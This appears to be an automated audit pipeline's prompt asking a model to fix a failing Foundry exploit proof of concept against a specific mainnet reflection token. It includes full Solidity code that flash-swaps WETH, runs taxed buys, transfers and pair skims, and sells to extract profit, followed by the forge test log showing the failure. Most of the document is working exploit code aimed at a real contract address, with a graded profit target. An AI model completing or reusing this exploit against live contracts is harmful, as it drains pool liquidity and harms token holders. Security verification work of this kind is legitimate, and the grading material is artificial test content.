You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reflection math omits the team fee from `rTransferAmount`, inflating balances and creating sellable phantom fee tokens
- claim: `_getRValues()` computes `rTransferAmount = rAmount - rFee` and never subtracts the reflected team portion, but `_takeTeam()` still credits `rTeam` to the contract. Each taxed transfer therefore credits more reflected balance to recipients plus the contract than was removed from the sender, breaking the reflection accounting invariants.
- impact: Taxed transfers over-credit non-excluded recipients and continuously accumulate phantom tokens in the contract fee bucket. Those excess tokens can later be swapped out for ETH against the pool, extracting real value from liquidity and holders.
- exploit_paths: ["`_transfer` -> `_tokenTransfer` -> `_transferStandard` / `_transferToExcluded` / `_transferFromExcluded` / `_transferBothExcluded` -> `_getValues` / `_getRValues` + `_takeTeam`", "Any taxed buy, sell, or wallet-to-wallet transfer where fees are enabled"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IHODL is IERC20 {
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router02 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TokenShuttle {
    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function sendAll(address token, address to) external {
        require(msg.sender == owner, "only owner");
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal != 0) {
            require(IERC20(token).transfer(to, bal), "sendAll failed");
        }
    }
}

contract HodlAttempt {
    error BucketAlreadyAboveSwapThreshold();
    error BudgetTooSmall();
    error PairMissing();
    error InvalidCallback();
    error NotProfitable();

    address internal constant TARGET = 0xEdA47E13fD1192E32226753dC2261C4A14908fb7;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 internal constant TOKEN_UNIT = 1e9;
    uint256 internal constant TEAM_SWAP_THRESHOLD = 4_000 * TOKEN_UNIT;
    uint256 internal constant TEAM_FEE_BPS = 1_000;
    uint256 internal constant BPS_DENOM = 10_000;

    address public immutable owner;
    TokenShuttle public immutable shuttle;

    address internal fundingPair;
    uint256 internal startingWethCapital;
    uint256 internal finalProfit;

    constructor(address owner_) {
        owner = owner_;
        shuttle = new TokenShuttle(address(this));
    }

    function runWithVerifierCapital(uint256 verifierWethBalance) external returns (uint256) {
        require(msg.sender == owner, "only owner");
        startingWethCapital = verifierWethBalance;
        _executeExploit(_deriveBuyNominal());
        return _finishFromDirectCapital();
    }

    function runWithFlashSwap() external returns (uint256) {
        require(msg.sender == owner, "only owner");

        uint256 buyNominal = _deriveBuyNominal();
        address pair = IUniswapV2Factory(FACTORY).getPair(WETH, USDC);
        if (pair == address(0)) revert PairMissing();
        fundingPair = pair;

        address hodlPair = IHODL(TARGET).uniswapV2Pair();
        (uint256 reserveIn, uint256 reserveOut) = _orderedReserves(hodlPair, WETH);
        uint256 borrowedWeth = _getAmountIn(buyNominal, reserveIn, reserveOut);

        if (IUniswapV2Pair(pair).token0() == WETH) {
            IUniswapV2Pair(pair).swap(borrowedWeth, 0, address(this), abi.encode(buyNominal, borrowedWeth));
        } else {
            IUniswapV2Pair(pair).swap(0, borrowedWeth, address(this), abi.encode(buyNominal, borrowedWeth));
        }

        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal == 0) revert NotProfitable();

        finalProfit = wethBal;
        require(IERC20(WETH).transfer(owner, wethBal), "profit transfer failed");
        return finalProfit;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender != fundingPair || sender != address(this)) revert InvalidCallback();

        uint256 borrowed = amount0 == 0 ? amount1 : amount0;
        (uint256 buyNominal, uint256 expectedBorrowed) = abi.decode(data, (uint256, uint256));
        require(borrowed == expectedBorrowed, "borrow mismatch");

        _executeExploit(buyNominal);

        uint256 repayment = ((borrowed * 1000) / 997) + 1;
        uint256 wethBal = IERC20(WETH).balanceOf(address(this));
        if (wethBal <= repayment) revert NotProfitable();

        require(IERC20(WETH).transfer(fundingPair, repayment), "repay failed");
    }

    function _executeExploit(uint256 buyNominal) internal {
        IERC20(WETH).approve(ROUTER, type(uint256).max);
        IERC20(TARGET).approve(ROUTER, type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = TARGET;

        // exploit_paths[0]: `_transfer` -> `_tokenTransfer` -> `_transferStandard`
        // -> `_getValues` / `_getRValues` + `_takeTeam`.
        //
        // The buy itself is a taxed pair -> verifier transfer with fees enabled.
        // That reaches the broken reflection math in `_getRValues()` while `_takeTeam()`
        // still credits the team bucket, which creates over-credited reflected balance.
        IUniswapV2Router02(ROUTER).swapTokensForExactTokens(
            buyNominal,
            IERC20(WETH).balanceOf(address(this)),
            buyPath,
            address(this),
            block.timestamp
        );

        _skimHodlPair();

        uint256 buyBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 firstTransfer = buyBalance > buyNominal ? buyNominal : buyBalance;
        require(firstTransfer != 0, "no HODL after buy");

        // exploit_paths[1]: `Any taxed buy, sell, or wallet-to-wallet transfer where fees are enabled`.
        // This verifier keeps the exact finding causality: after the taxed buy, it performs
        // two additional taxed wallet transfers to amplify the same broken accounting path
        // before finally realizing value on the sell. The shuttle is only an attacker-owned
        // receiver used to force the public wallet-to-wallet transfer leg on chain.
        require(IERC20(TARGET).transfer(address(shuttle), firstTransfer), "transfer out failed");
        _skimHodlPair();

        shuttle.sendAll(TARGET, address(this));
        _skimHodlPair();

        uint256 sellAmount = IERC20(TARGET).balanceOf(address(this));
        require(sellAmount != 0, "no HODL to sell");

        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = WETH;

        // exploit_paths[1]: the final taxed sell converts the phantom fee/reflection surplus
        // into pre-existing on-chain WETH from the live pool. No profit token is deployed.
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            sellPath,
            address(this),
            block.timestamp
        );
    }

    function _finishFromDirectCapital() internal returns (uint256) {
        uint256 endingWeth = IERC20(WETH).balanceOf(address(this));
        if (endingWeth <= startingWethCapital) revert NotProfitable();

        finalProfit = endingWeth - startingWethCapital;
        require(IERC20(WETH).transfer(owner, endingWeth), "capital return failed");
        return finalProfit;
    }

    function _deriveBuyNominal() internal view returns (uint256 buyNominal) {
        uint256 feeBucket = IERC20(TARGET).balanceOf(TARGET);

        if (feeBucket >= TEAM_SWAP_THRESHOLD) revert BucketAlreadyAboveSwapThreshold();

        uint256 remainingTeamBucket = TEAM_SWAP_THRESHOLD - feeBucket - 1;
        uint256 nominalBudget = (remainingTeamBucket * BPS_DENOM) / TEAM_FEE_BPS;

        // Direct-capital-first strategy: size the buy so the taxed buy, taxed transfer out,
        // and taxed transfer back all happen before the token contract reaches its own
        // auto-swap threshold. That preserves the finding's transfer-based causality.
        buyNominal = nominalBudget / 3;
        if (buyNominal < TOKEN_UNIT) revert BudgetTooSmall();
    }

    function _skimHodlPair() internal {
        address hodlPair = IHODL(TARGET).uniswapV2Pair();
        (uint256 reserveToken, ) = _orderedReserves(hodlPair, TARGET);
        uint256 liveBal = IERC20(TARGET).balanceOf(hodlPair);
        if (liveBal > reserveToken) {
            IUniswapV2Pair(hodlPair).skim(address(this));
        }
    }

    function _orderedReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == tokenIn) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(IUniswapV2Pair(pair).token1() == tokenIn, "token mismatch");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
        require(reserveIn != 0 && reserveOut != 0, "empty reserves");
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "insufficient reserve out");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xEdA47E13fD1192E32226753dC2261C4A14908fb7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal realizedProfit;
    bool internal attempted;
    bool internal profitable;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        HodlAttempt attempt = new HodlAttempt(address(this));
        uint256 verifierWeth = IERC20(WETH).balanceOf(address(this));

        if (verifierWeth != 0) {
            require(IERC20(WETH).transfer(address(attempt), verifierWeth), "seed transfer failed");
            try attempt.runWithVerifierCapital(verifierWeth) returns (uint256 profit_) {
                realizedProfit = profit_;
                profitable = profit_ != 0;
            } catch {
                realizedProfit = 0;
                profitable = false;
            }
            return;
        }

        try attempt.runWithFlashSwap() returns (uint256 profit_) {
            realizedProfit = profit_;
            profitable = profit_ != 0;
        } catch {
            realizedProfit = 0;
            profitable = false;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "`_transfer` -> `_tokenTransfer` -> `_transferStandard` -> `_getValues` / `_getRValues` + `_takeTeam`; taxed buy -> taxed wallet transfer out -> taxed wallet transfer back -> taxed sell";
    }

    function hypothesisValidated() external view returns (bool) {
        return profitable;
    }

    function target() external pure returns (address) {
        return TARGET;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.75s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1482118)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [1482118] FlawVerifierTest::testExploit()
    ├─ [189] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [1441909] FlawVerifier::executeOnOpportunity()
    │   ├─ [1366418] → new HodlAttempt@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   ├─ [134214] → new TokenShuttle@0x41C3c259514f88211c4CA2fd805A93F8F9A57504
    │   │   │   └─ ← [Return] 669 bytes of code
    │   │   └─ ← [Return] 5992 bytes of code
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [15663] HodlAttempt::runWithFlashSwap()
    │   │   ├─ [12407] 0xEdA47E13fD1192E32226753dC2261C4A14908fb7::balanceOf(0xEdA47E13fD1192E32226753dC2261C4A14908fb7) [staticcall]
    │   │   │   └─ ← [Return] 373024455673143078 [3.73e17]
    │   │   └─ ← [Revert] BucketAlreadyAboveSwapThreshold()
    │   └─ ← [Stop]
    ├─ [189] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [313] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17220892 [1.722e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at HodlAttempt.runWithFlashSwap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.31s (1.06s CPU time)

Ran 1 test suite in 3.37s (3.31s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1482118)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
